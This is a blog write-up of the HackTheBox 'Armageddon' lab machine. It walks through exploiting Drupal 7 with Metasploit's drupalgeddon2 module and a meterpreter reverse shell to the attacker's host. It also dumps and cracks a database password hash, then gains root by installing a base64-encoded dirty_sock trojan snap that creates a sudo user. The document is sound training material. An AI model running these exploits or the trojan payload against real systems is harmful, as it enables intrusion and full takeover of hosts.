<!DOCTYPE html>
<html lang="en-us">
<head>
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title> Hackthebox - Armageddon - Write up | Itarow</title>
  <link rel = 'canonical' href = 'https://itarow.github.io/posts/hackthebox-armageddon/'>
  <meta name="description" content="CS student, writing some write up of cool CTF&#39;s challenges and infosec content.">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="all,follow">
  <meta name="googlebot" content="index,follow,snippet,archive">
  <meta property="og:title" content="Hackthebox - Armageddon - Write up" />
<meta property="og:description" content="Write up of Armageddon from HackTheBox" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itarow.github.io/posts/hackthebox-armageddon/" /><meta property="og:image" content="https://itarow.github.io/img/armageddon/banner.jpeg" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-07-08T13:26:39+02:00" />
<meta property="article:modified_time" content="2021-07-08T13:26:39+02:00" />


  <meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://itarow.github.io/img/armageddon/banner.jpeg"/>

<meta name="twitter:title" content="Hackthebox - Armageddon - Write up"/>
<meta name="twitter:description" content="Write up of Armageddon from HackTheBox"/>

  
  
    
  
  
  <link rel="stylesheet" href="https://itarow.github.io/css/styles.a202629510fba11c0596546c1bf55ebd1c91f1b6b769793fe3f5e62f2749179f461c8c2a5131c56e4e811301624dfd10bda84eef0d9bdff17ec5bb31710cf24c.css" integrity="sha512-ogJilRD7oRwFllRsG/VevRyR8ba3aXk/4/XmLydJF59GHIwqUTHFbk6BEwFiTf0QvahO7w2b3/F&#43;xbsxcQzyTA=="> 

  
  
  
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  

  
<link rel="icon" type="image/png" href="https://itarow.github.io/images/favicon.ico" />

  
  
</head>

<body class="max-width mx-auto px3 ltr">
  <div class="content index py4">

  <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/categories">Categories</a></li>
         
        <li><a href="/whoami">Whoami</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li>
          <a class="icon" href=" https://itarow.github.io/posts/hackthebox-ophiuchi/" aria-label="Previous">
            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
          </a>
        </li>
        
        
        <li>
          <a class="icon" href="https://itarow.github.io/whoami/" aria-label="Next">
            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
          </a>
        </li>
        
        <li>
          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
          </a>
        </li>
        <li>
          <a class="icon" href="#" aria-label="Share">
            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
          </a>
        </li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-armageddon%2f" aria-label="Facebook">
      <i class="fab fa-facebook " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-armageddon%2f&text=Hackthebox%20-%20Armageddon%20-%20Write%20up" aria-label="Twitter">
      <i class="fab fa-twitter " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-armageddon%2f&title=Hackthebox%20-%20Armageddon%20-%20Write%20up" aria-label="Linkedin">
      <i class="fab fa-linkedin " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-armageddon%2f&is_video=false&description=Hackthebox%20-%20Armageddon%20-%20Write%20up" aria-label="Pinterest">
      <i class="fab fa-pinterest " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=Hackthebox%20-%20Armageddon%20-%20Write%20up&body=Check out this article: https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-armageddon%2f" aria-label="Email">
      <i class="fas fa-envelope " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-armageddon%2f&title=Hackthebox%20-%20Armageddon%20-%20Write%20up" aria-label="Pocket">
      <i class="fab fa-get-pocket " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-armageddon%2f&title=Hackthebox%20-%20Armageddon%20-%20Write%20up" aria-label="reddit">
      <i class="fab fa-reddit " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-armageddon%2f&name=Hackthebox%20-%20Armageddon%20-%20Write%20up&description=Write%20up%20of%20Armageddon%20from%20HackTheBox" aria-label="Tumblr">
      <i class="fab fa-tumblr " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-armageddon%2f&t=Hackthebox%20-%20Armageddon%20-%20Write%20up" aria-label="Hacker News">
      <i class="fab fa-hacker-news " aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>
    
  </span>
</div>


  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
    <header>
      <h1 class="posttitle" itemprop="name headline">
        Hackthebox - Armageddon - Write up
      </h1>
      <div class="meta">
        
        <div class="postdate">
          
          <time datetime="2021-07-08 13:26:39 &#43;0200 CEST" itemprop="datePublished">2021-07-08</time>
          
        </div>
        
        
        <div class="article-read-time">
          <i class="far fa-clock"></i>
          
          4 minute read
        </div>
        
        
        <div class="article-category">
            <i class="fas fa-archive"></i>
            
            
            <a class="category-link" href="/categories/hackthebox">HackTheBox</a>
            
        </div>
        
        
        <div class="article-tag">
            <i class="fas fa-tag"></i>
            
            
            <a class="tag-link" href="/tags/hackthebox" rel="tag">HackTheBox</a>
            
             ,  
            <a class="tag-link" href="/tags/write-up" rel="tag">Write-up</a>
            
             ,  
            <a class="tag-link" href="/tags/cve" rel="tag">CVE</a>
            
             ,  
            <a class="tag-link" href="/tags/drupal" rel="tag">drupal</a>
            
        </div>
        
      </div>
    </header>

  
    
    <div id="toc">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#foothold">Foothold</a></li>
    <li><a href="#user">User</a></li>
    <li><a href="#root">Root</a></li>
  </ul>
</nav>
    </div>
    
    <div class="content" itemprop="articleBody">
      <p>Hi everyone, I rooted the box &ldquo;Armageddon&rdquo; from HackTheBox. This box include exploitation of drupal, duplicate credentials with bad password, and malicious installation of snap package to gain root access.</p>
<h2 id="foothold">Foothold</h2>
<p>Let&rsquo;s nmap the box :</p>
<pre tabindex="0"><code class="language-code" data-lang="code">$ nmap -A -p- -T4 10.10.10.233                                                                                                                 
Starting Nmap 7.80 ( https://nmap.org ) at 2021-07-08 13:24 CEST
Nmap scan report for 10.10.10.233
Host is up (0.064s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.31 seconds
</code></pre><p>Let&rsquo;s move into the website on port 80.</p>
<p><img src="/img/armageddon/img1.png" alt=""></p>
<p>Classic webpage with login form. We could try some SQL injection but it doesn&rsquo;t work. Lets see the source code :</p>
<p><img src="/img/armageddon/img2.png" alt=""></p>
<p>So the website uses Drupal7, this is vulnerable to the famous exploit &lsquo;Drupalgeddon&rsquo;. We could link this with the same of the box, so we now we are on the right way.</p>
<p>Let&rsquo;s use metasploit to complete quickly the exploit. We use the second exploit because the first doesn&rsquo;t work with the website.</p>
<pre tabindex="0"><code class="language-code" data-lang="code">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; options

Module options (exploit/unix/webapp/drupal_drupalgeddon2):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   DUMP_OUTPUT  false            no        Dump payload command output
   PHP_FUNC     passthru         yes       PHP function to execute
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
   RPORT        80               yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /                yes       Path to Drupal install
   VHOST                         no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.10     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (PHP In-Memory)


msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set RHOSTS 10.10.10.233
RHOSTS =&gt; 10.10.10.233
msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set LHOST 10.10.14.119
LHOST =&gt; 10.10.14.119
msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit

[*] Started reverse TCP handler on 10.10.14.119:4444
[*] Executing automatic check (disable AutoCheck to override)
[+] The target is vulnerable.
[*] Sending stage (39282 bytes) to 10.10.10.233
[*] Meterpreter session 1 opened (10.10.14.119:4444 -&gt; 10.10.10.233:40546) at 2021-07-08 11:37:03 +0000

meterpreter &gt;
</code></pre><p>So we have a shell, let&rsquo;s gain more privielege.</p>
<h2 id="user">User</h2>
<p>So we check some files and we see a files called &lsquo;settings.php&rsquo;.
We read it and we see somewhere in the file :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#8be9fd;font-style:italic">$databases</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">array</span> (
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>  <span style="color:#f1fa8c">&#39;default&#39;</span> <span style="color:#ff79c6">=&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>  <span style="color:#ff79c6">array</span> (
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>    <span style="color:#f1fa8c">&#39;default&#39;</span> <span style="color:#ff79c6">=&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    <span style="color:#ff79c6">array</span> (
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>      <span style="color:#f1fa8c">&#39;database&#39;</span> <span style="color:#ff79c6">=&gt;</span> <span style="color:#f1fa8c">&#39;drupal&#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>      <span style="color:#f1fa8c">&#39;username&#39;</span> <span style="color:#ff79c6">=&gt;</span> <span style="color:#f1fa8c">&#39;drupaluser&#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>      <span style="color:#f1fa8c">&#39;password&#39;</span> <span style="color:#ff79c6">=&gt;</span> <span style="color:#f1fa8c">&#39;CQHEy@9M*m23gBVj&#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>      <span style="color:#f1fa8c">&#39;host&#39;</span> <span style="color:#ff79c6">=&gt;</span> <span style="color:#f1fa8c">&#39;localhost&#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>      <span style="color:#f1fa8c">&#39;port&#39;</span> <span style="color:#ff79c6">=&gt;</span> <span style="color:#f1fa8c">&#39;&#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>      <span style="color:#f1fa8c">&#39;driver&#39;</span> <span style="color:#ff79c6">=&gt;</span> <span style="color:#f1fa8c">&#39;mysql&#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>      <span style="color:#f1fa8c">&#39;prefix&#39;</span> <span style="color:#ff79c6">=&gt;</span> <span style="color:#f1fa8c">&#39;&#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>    ),
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>  ),
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>);
</span></span></code></pre></div><p>So we have some Sql credentials, lets use them to see if we could find some passwords.</p>
<pre tabindex="0"><code class="language-code" data-lang="code">mysql -u drupaluser --password=CQHEy@9M*m23gBVj -e &#39;use drupal; SELECT * from users&#39;

...
brucetherealadmin	$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt	admin@armageddon.eu
...
</code></pre><p>We find the hash of a user called brucetherealadmin. If we checked /etc/passwd, we could see that, he is a also user in the box. So if we crack his hash, we may could log in in ssh with the password find.</p>
<p>The hash type is Drupal7 (quick google search), let&rsquo;s use hashcat to crack it.</p>
<p>The mode with Drupal7 hashes is 7900.</p>
<pre tabindex="0"><code class="language-code" data-lang="code">$ hashcat -m 7900 -a 0 hash ~/Exegol/shared-resources/rockyou.txt
...
$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo
...
</code></pre><p><img src="/img/armageddon/img3.png" alt=""></p>
<p>So we find the password -&gt; booboo . Let&rsquo;s ssh with it.</p>
<pre tabindex="0"><code class="language-code" data-lang="code">$ ssh brucetherealadmin@10.10.10.233
brucetherealadmin@10.10.10.233&#39;s password:
Last login: Fri Mar 19 08:01:19 2021 from 10.10.14.5
[brucetherealadmin@armageddon ~]$
</code></pre><p>Okey, now let&rsquo;s move into Root.</p>
<h2 id="root">Root</h2>
<p>Quick sudo -l :</p>
<pre tabindex="0"><code class="language-code" data-lang="code">[brucetherealadmin@armageddon ~]$ sudo -l
Entrées par défaut pour brucetherealadmin sur armageddon :
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=&#34;COLORS DISPLAY HOSTNAME HISTSIZE
    KDEDIR LS_COLORS&#34;, env_keep+=&#34;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&#34;, env_keep+=&#34;LC_COLLATE LC_IDENTIFICATION
    LC_MEASUREMENT LC_MESSAGES&#34;, env_keep+=&#34;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&#34;, env_keep+=&#34;LC_TIME LC_ALL LANGUAGE
    LINGUAS _XKB_CHARSET XAUTHORITY&#34;, secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

L&#39;utilisateur brucetherealadmin peut utiliser les commandes suivantes sur armageddon :
    (root) NOPASSWD: /usr/bin/snap install *
</code></pre><p>So we see that we could install snap package with root right, strange..</p>
<p>Let&rsquo;s google &ldquo;spad install privesc&rdquo;
We found this CVE(<a href="https://www.exploit-db.com/exploits/46362">https://www.exploit-db.com/exploits/46362</a>)
Our version of snap is no vulnerable to this CVE, but we could adapt the exploit to our case.</p>
<p>We are going to use the snap trojan of the CVE, install it with sudo rights, and this is going to allow us to login with dirty_sock:dirty_sock and have root rights.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>TROJAN_SNAP <span style="color:#ff79c6">=</span> (<span style="color:#f1fa8c">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#f1fa8c">aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span><span style="color:#f1fa8c">/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span><span style="color:#f1fa8c">ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span><span style="color:#f1fa8c">TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span><span style="color:#f1fa8c">T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span><span style="color:#f1fa8c">Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span><span style="color:#f1fa8c">ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span><span style="color:#f1fa8c">ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span><span style="color:#f1fa8c">L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span><span style="color:#f1fa8c">b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span><span style="color:#f1fa8c">rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span><span style="color:#f1fa8c">rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span><span style="color:#f1fa8c">AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span><span style="color:#f1fa8c">XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span><span style="color:#f1fa8c">RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span><span style="color:#f1fa8c">AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>               <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;A&#39;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">4256</span> <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;==&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span><span style="color:#8be9fd;font-style:italic">print</span>(TROJAN_SNAP)
</span></span></code></pre></div><pre tabindex="0"><code class="language-code" data-lang="code">$ python2.7 ex.py &gt; base64.txt
$ base64 -d base64.txt &gt; trojan_snap                                      1 ↵  
</code></pre><p>Now, let&rsquo;s download it on the box. After that, run snap install command with sudo and avoid protection with &ldquo;&ndash;dangerous &ndash;devmode &ldquo;:</p>
<pre tabindex="0"><code class="language-code" data-lang="code">[brucetherealadmin@armageddon tmp]$ sudo /usr/bin/snap install --dangerous --devmode ./trojan_snap
dirty-sock 0.1 installed
..
$ cat /etc/passwd
...
dirty_sock:x:1001:1001::/home/dirty_sock:/bin/bash
...
$ su dirty_sock
[dirty_sock@armageddon /]$ sudo su
[root@armageddon /]#
</code></pre><p>Now we are root :) . This box was very cool, really enjoyed it, especially the root part. Thanks for reading and see you later.</p>

    </div>
  </article>

  
  





  <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/categories">Categories</a></li>
         
          <li><a href="/whoami">Whoami</a></li>
        
      </ul>
    </div>

    

    <div id="share-footer" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-armageddon%2f" aria-label="Facebook">
      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-armageddon%2f&text=Hackthebox%20-%20Armageddon%20-%20Write%20up" aria-label="Twitter">
      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-armageddon%2f&title=Hackthebox%20-%20Armageddon%20-%20Write%20up" aria-label="Linkedin">
      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-armageddon%2f&is_video=false&description=Hackthebox%20-%20Armageddon%20-%20Write%20up" aria-label="Pinterest">
      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=Hackthebox%20-%20Armageddon%20-%20Write%20up&body=Check out this article: https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-armageddon%2f" aria-label="Email">
      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-armageddon%2f&title=Hackthebox%20-%20Armageddon%20-%20Write%20up" aria-label="Pocket">
      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-armageddon%2f&title=Hackthebox%20-%20Armageddon%20-%20Write%20up" aria-label="reddit">
      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-armageddon%2f&name=Hackthebox%20-%20Armageddon%20-%20Write%20up&description=Write%20up%20of%20Armageddon%20from%20HackTheBox" aria-label="Tumblr">
      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-armageddon%2f&t=Hackthebox%20-%20Armageddon%20-%20Write%20up" aria-label="Hacker News">
      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>

    <div id="actions-footer">
      
        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
